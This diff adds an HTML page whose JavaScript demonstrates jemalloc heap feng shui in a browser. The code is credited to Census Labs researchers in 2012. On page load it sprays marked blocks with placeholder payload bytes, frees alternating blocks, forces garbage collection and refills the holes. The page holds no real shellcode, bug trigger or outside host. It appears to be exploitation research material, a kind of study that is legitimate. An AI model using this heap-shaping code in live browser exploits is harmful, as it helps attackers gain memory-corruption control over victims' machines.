@@ -1,0 +1,139 @@
+<html>
+<head>
+<script>
+
+function jemalloc_feng_shui(blocks, size)
+{
+    // Copyright (c) 2012 Patroklos Argyroudis <argp at domain census-labs.com>
+    // Copyright (c) 2012 Chariton Karamitas <huku at domain census-labs.com>
+    // Copyright (c) 2012 Census, Inc. (http://www.census-labs.com/)
+
+    var block_size = size / 2;
+
+    // rop/bootstrap/whatever
+    var marker = unescape("%ubeef%udead");
+    marker += marker;
+
+    // shellcode/payload
+    var content = unescape("%u6666%u6666");
+
+    while(content.length < (block_size / 2))
+    {
+        content += content;
+    }
+
+    var arr = [];
+
+    for(i = 0; i < blocks; i++)
+    {
+        // construct the random block padding (corelanc0d3r's trick)
+        var rnd1 = Math.floor(Math.random() * 1000) % 16;
+        var rnd2 = Math.floor(Math.random() * 1000) % 16;
+        var rnd3 = Math.floor(Math.random() * 1000) % 16;
+        var rnd4 = Math.floor(Math.random() * 1000) % 16;
+
+        var rndstr = "%u" + rnd1.toString() + rnd2.toString();
+        rndstr += "%u" + rnd3.toString() + rnd4.toString();
+
+        var padding = unescape(rndstr);
+        
+        while(padding.length < block_size - marker.length - content.length)
+        {
+            padding += padding;
+        }
+
+        // construct the block
+        var block = marker + content + padding;
+
+        // if required repeat the block
+        while(block.length < block_size)
+        {
+            block += block;
+        }
+
+        // spray block
+        arr[i] = block.substr(0);
+    }
+
+    // for debugging
+    Math.asin(1);
+
+    marker = unescape("%ubabe%ucafe");
+    marker += marker;
+
+    content = unescape("%u7777%u7777");
+
+    while(content.length < (block_size / 2))
+    {
+        content += content;
+    }
+
+    for(i = 0; i < blocks; i += 2)
+    {
+        delete(arr[i]);
+        // arr.splice(i, 1);
+        arr[i] = null;
+    }
+
+    var ret = trigger_gc();
+ 
+    alert("After garbage collection: " + ret.length);
+
+    for(i = 0; i < blocks; i += 2)
+    {
+        var rnd1 = Math.floor(Math.random() * 1000) % 16;
+        var rnd2 = Math.floor(Math.random() * 1000) % 16;
+        var rnd3 = Math.floor(Math.random() * 1000) % 16;
+        var rnd4 = Math.floor(Math.random() * 1000) % 16;
+
+        var rndstr = "%u" + rnd1.toString() + rnd2.toString();
+        rndstr += "%u" + rnd3.toString() + rnd4.toString();
+
+        var padding = unescape(rndstr);
+
+        while(padding.length < block_size - marker.length - content.length)
+        {
+            padding += padding;
+        }
+
+        var block = marker + content + padding;
+
+        while(block.length < block_size)
+        {
+            block += block;
+        }
+
+        arr[i] = block.substr(0);
+    }
+
+    // for debugging
+    Math.atan2(6, 6);
+
+    return arr;
+}
+
+function trigger_gc()
+{
+    var gc = [];
+    
+    for(i = 0; i < 100000; i++)
+    {
+        gc[i] = new Array();
+    }
+
+    return gc;
+}
+
+function run_feng_shui()
+{
+    // 1024 spray blocks of size 320 (target run size: 512)
+    var foo = jemalloc_feng_shui(1024, 320);
+
+    alert(foo.length);
+}
+</script>
+</head>
+<body onload="run_feng_shui();">
+0x1337
+</body>
+</html>
